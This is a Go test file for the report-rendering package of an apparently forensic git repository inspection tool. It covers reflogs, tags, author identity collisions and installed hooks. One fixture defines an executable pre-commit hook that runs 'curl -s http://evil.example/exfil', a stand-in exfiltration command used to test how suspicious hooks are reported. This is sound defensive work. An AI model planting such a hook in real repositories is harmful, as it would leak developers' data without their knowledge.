package snapshot

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/andpalmier/repopsy/internal/git"
)

func at(s string) time.Time {
	t, _ := time.Parse(time.RFC3339, s)
	return t
}

// ── Write ───────────────────────────────────────────────────────────────────

func TestWriteCreatesTheDirectory(t *testing.T) {
	dir := filepath.Join(t.TempDir(), "does", "not", "exist")

	if err := Write(dir, Tags{}); err != nil {
		t.Fatalf("Write: %v", err)
	}
	if _, err := os.Stat(filepath.Join(dir, "TAGS.txt")); err != nil {
		t.Errorf("expected TAGS.txt in a freshly created directory: %v", err)
	}
}

func TestWriteEveryReportHasADistinctFilename(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range []Report{Manifest{}, Reflog{}, Tags{}, Identities{}} {
		name := r.Filename()
		if name == "" {
			t.Errorf("%T has no filename", r)
		}
		if seen[name] {
			t.Errorf("%T reuses the filename %q", r, name)
		}
		seen[name] = true
	}
}

// ── Reflog ──────────────────────────────────────────────────────────────────

func sampleReflog() Reflog {
	return Reflog{Entries: []git.ReflogEntry{
		{
			Ref: "refs/heads/main", Commit: "379ec9e1deee0b1a29ebe4a7a3394097ca70c2ad",
			At: at("2023-12-05T15:15:15+01:00"), Actor: "Alice Dev", Email: "alice@example.com",
			Action: "commit: replacement commit",
		},
		{
			Ref: "refs/heads/main", Commit: "50c0ac245f97586eb27e74ef73f2981d942d9d4e",
			At: at("2023-12-05T15:14:02+01:00"), Actor: "Alice Dev", Email: "alice@example.com",
			Action: "reset: moving to HEAD~2",
		},
	}}
}

func TestReflogGolden(t *testing.T) {
	var buf strings.Builder
	if err := sampleReflog().Render(&buf); err != nil {
		t.Fatalf("Render: %v", err)
	}
	assertGolden(t, "reflog.golden", buf.String())
}

// TestReflogNamesTheActor covers a bug this template had: a Go template
// pipeline passes the piped value as the LAST argument, so
// {{.Actor | or_ "(unknown)"}} always returned the fallback and every entry
// read "by (unknown)".
func TestReflogNamesTheActor(t *testing.T) {
	var buf strings.Builder
	if err := sampleReflog().Render(&buf); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "by Alice Dev <alice@example.com>") {
		t.Errorf("the actor's name is missing:\n%s", buf.String())
	}
	if strings.Contains(buf.String(), "(unknown)") {
		t.Errorf("fell back to (unknown) despite a known actor:\n%s", buf.String())
	}
}

func TestReflogFallsBackWhenTheActorIsUnknown(t *testing.T) {
	r := Reflog{Entries: []git.ReflogEntry{{Ref: "refs/heads/main", Email: "a@b"}}}

	var buf strings.Builder
	if err := r.Render(&buf); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "(unknown)") {
		t.Errorf("expected the fallback for an empty actor:\n%s", buf.String())
	}
	// A zero time must not render as year 1.
	if strings.Contains(buf.String(), "0001-01-01") {
		t.Errorf("a zero timestamp leaked through:\n%s", buf.String())
	}
}

func TestReflogEmptyExplainsWhy(t *testing.T) {
	var buf strings.Builder
	if err := (Reflog{}).Render(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "(no reflog entries)") {
		t.Errorf("expected an explicit empty marker:\n%s", out)
	}
	// The reason an empty log is not proof of no rewriting must be stated.
	if !strings.Contains(out, "NOT transferred by clone") {
		t.Errorf("missing the local-reflog caveat:\n%s", out)
	}
}

// ── Tags ────────────────────────────────────────────────────────────────────

func TestTagsGolden(t *testing.T) {
	tags := Tags{Tags: []git.Tag{
		{Name: "light", Target: "fb2f13f5afefc73dd16a7808bbbcb06cc332c0f8"},
		{
			Name: "v1.0", Target: "fb2f13f5afefc73dd16a7808bbbcb06cc332c0f8",
			Annotated: true, Object: "52eeec1baa7d758e10178c82bccd96f6778297ca",
			Tagger: "Alice Dev", TaggerEmail: "alice@example.com",
			TaggerDate: at("2023-12-05T15:37:04+01:00"),
			Subject:    "release one", Signed: true,
		},
	}}

	var buf strings.Builder
	if err := tags.Render(&buf); err != nil {
		t.Fatalf("Render: %v", err)
	}
	assertGolden(t, "tags.golden", buf.String())
}

func TestTagsDistinguishAnnotatedFromLightweight(t *testing.T) {
	tags := Tags{Tags: []git.Tag{
		{Name: "light", Target: "aaa"},
		{Name: "ann", Target: "bbb", Annotated: true, Object: "ccc", Tagger: "T", Signed: false},
	}}

	var buf strings.Builder
	if err := tags.Render(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "lightweight") || !strings.Contains(out, "annotated (tag object ccc)") {
		t.Errorf("tag types not distinguished:\n%s", out)
	}
	// A lightweight tag has no tagger, so that block must be omitted for it.
	if strings.Count(out, "Tagger:") != 1 {
		t.Errorf("expected exactly one Tagger block:\n%s", out)
	}
	if !strings.Contains(out, "Signature:    none") {
		t.Errorf("unsigned annotated tag should say so:\n%s", out)
	}
}

func TestTagsEmpty(t *testing.T) {
	var buf strings.Builder
	if err := (Tags{}).Render(&buf); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "(no tags)") {
		t.Errorf("expected an explicit empty marker:\n%s", buf.String())
	}
}

// ── Identities ──────────────────────────────────────────────────────────────

func TestNewIdentitiesAggregates(t *testing.T) {
	commits := []git.Commit{
		{
			Author: "Alice", AuthorEmail: "alice@example.com", AuthorDate: at("2023-01-01T00:00:00Z"),
			Committer: "Alice", CommitterEmail: "alice@example.com", CommitDate: at("2023-01-01T00:00:00Z"),
		},
		{
			Author: "Alice", AuthorEmail: "alice@example.com", AuthorDate: at("2023-06-01T00:00:00Z"),
			Committer: "Bob", CommitterEmail: "bob@example.com", CommitDate: at("2023-06-02T00:00:00Z"),
		},
	}

	ids := NewIdentities(commits)
	if len(ids.Identities) != 2 {
		t.Fatalf("got %d identities, want 2: %+v", len(ids.Identities), ids.Identities)
	}

	// Most active first.
	alice := ids.Identities[0]
	if alice.Email != "alice@example.com" {
		t.Fatalf("most active is %q, want alice", alice.Email)
	}
	if alice.AsAuthor != 2 || alice.AsCommitter != 1 {
		t.Errorf("alice = %d author / %d committer, want 2/1", alice.AsAuthor, alice.AsCommitter)
	}
	if !alice.First.Equal(at("2023-01-01T00:00:00Z")) || !alice.Last.Equal(at("2023-06-01T00:00:00Z")) {
		t.Errorf("alice seen %v..%v", alice.First, alice.Last)
	}
}

func TestNewIdentitiesFindsCollisions(t *testing.T) {
	commits := []git.Commit{
		// One email, two names — how impersonation looks.
		{Author: "Alice", AuthorEmail: "shared@example.com", Committer: "Alice", CommitterEmail: "shared@example.com"},
		{Author: "Alice Dev", AuthorEmail: "shared@example.com", Committer: "Alice Dev", CommitterEmail: "shared@example.com"},
		// One name, two emails — how a reconfigured client looks.
		{Author: "Bob", AuthorEmail: "bob@work.com", Committer: "Bob", CommitterEmail: "bob@work.com"},
		{Author: "Bob", AuthorEmail: "bob@home.com", Committer: "Bob", CommitterEmail: "bob@home.com"},
	}

	ids := NewIdentities(commits)

	if len(ids.SharedEmails) != 1 || !strings.Contains(ids.SharedEmails[0], "shared@example.com") {
		t.Errorf("SharedEmails = %v", ids.SharedEmails)
	}
	if !strings.Contains(ids.SharedEmails[0], "Alice") || !strings.Contains(ids.SharedEmails[0], "Alice Dev") {
		t.Errorf("both names should be listed: %v", ids.SharedEmails)
	}
	if len(ids.SharedNames) != 1 || !strings.Contains(ids.SharedNames[0], "Bob") {
		t.Errorf("SharedNames = %v", ids.SharedNames)
	}
}

func TestIdentitiesGolden(t *testing.T) {
	commits := []git.Commit{
		{
			Author: "Alice Dev", AuthorEmail: "alice@example.com", AuthorDate: at("2023-01-01T09:00:00+01:00"),
			Committer: "Alice Dev", CommitterEmail: "alice@example.com", CommitDate: at("2023-01-01T09:00:00+01:00"),
		},
		{
			Author: "Bob Ops", AuthorEmail: "alice@example.com", AuthorDate: at("2023-02-01T09:00:00+01:00"),
			Committer: "Alice Dev", CommitterEmail: "alice@example.com", CommitDate: at("2023-02-01T09:00:00+01:00"),
		},
	}

	var buf strings.Builder
	if err := NewIdentities(commits).Render(&buf); err != nil {
		t.Fatalf("Render: %v", err)
	}
	assertGolden(t, "identities.golden", buf.String())
}

func TestIdentitiesNamesEveryone(t *testing.T) {
	// The same pipeline bug as the reflog: the name must not be replaced by the
	// "(no name)" fallback.
	commits := []git.Commit{{Author: "Alice Dev", AuthorEmail: "a@b", Committer: "Alice Dev", CommitterEmail: "a@b"}}

	var buf strings.Builder
	if err := NewIdentities(commits).Render(&buf); err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(buf.String(), "Alice Dev <a@b>") {
		t.Errorf("the identity's name is missing:\n%s", buf.String())
	}
	if strings.Contains(buf.String(), "(no name)") {
		t.Errorf("fell back to (no name) despite a known name:\n%s", buf.String())
	}
}

func TestIdentitiesEmpty(t *testing.T) {
	var buf strings.Builder
	if err := NewIdentities(nil).Render(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "(no identities)") {
		t.Errorf("expected an explicit empty marker:\n%s", out)
	}
	if strings.Count(out, "(none)") != 2 {
		t.Errorf("both collision sections should report (none):\n%s", out)
	}
}

// ── Repository state ────────────────────────────────────────────────────────

func TestRepositoryStateGolden(t *testing.T) {
	state := RepositoryState{State: git.State{
		Config: "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@example.com:acme/demo.git\n",
		Hooks: []git.Hook{
			{
				Name: "post-commit", Size: 30, SHA256: strings.Repeat("a", 64),
				Executable: false, Content: "#!/bin/sh\necho inert\n",
			},
			{
				Name: "pre-commit", Size: 72, SHA256: strings.Repeat("b", 64),
				Executable: true, Content: "#!/bin/sh\ncurl -s http://evil.example/exfil\n",
			},
		},
	}}

	var buf strings.Builder
	if err := state.Render(&buf); err != nil {
		t.Fatalf("Render: %v", err)
	}
	assertGolden(t, "repository-state.golden", buf.String())
}

func TestRepositoryStateFlagsInertHooks(t *testing.T) {
	state := RepositoryState{State: git.State{
		Hooks: []git.Hook{{Name: "post-commit", Executable: false, Content: "x"}},
	}}

	var buf strings.Builder
	if err := state.Render(&buf); err != nil {
		t.Fatal(err)
	}
	// A hook git will not run must say so, or a reader assumes it fires.
	if !strings.Contains(buf.String(), "git will not run it") {
		t.Errorf("a non-executable hook was not flagged:\n%s", buf.String())
	}
}

func TestRepositoryStateTruncationIsVisible(t *testing.T) {
	state := RepositoryState{State: git.State{
		Hooks: []git.Hook{{Name: "pre-push", Size: 9000, Content: "AAA", Truncated: true}},
	}}

	var buf strings.Builder
	if err := state.Render(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "(truncated)") {
		t.Errorf("truncation not disclosed:\n%s", out)
	}
	// The real size must still be reported, so the excerpt is not mistaken
	// for the whole file.
	if !strings.Contains(out, "9000 bytes") {
		t.Errorf("the full size is missing:\n%s", out)
	}
}

func TestRepositoryStateEmpty(t *testing.T) {
	var buf strings.Builder
	if err := (RepositoryState{}).Render(&buf); err != nil {
		t.Fatal(err)
	}
	out := buf.String()
	if !strings.Contains(out, "(no local configuration file)") {
		t.Errorf("expected an explicit marker for a missing config:\n%s", out)
	}
	if !strings.Contains(out, "(no hooks installed)") {
		t.Errorf("expected an explicit marker for no hooks:\n%s", out)
	}
}
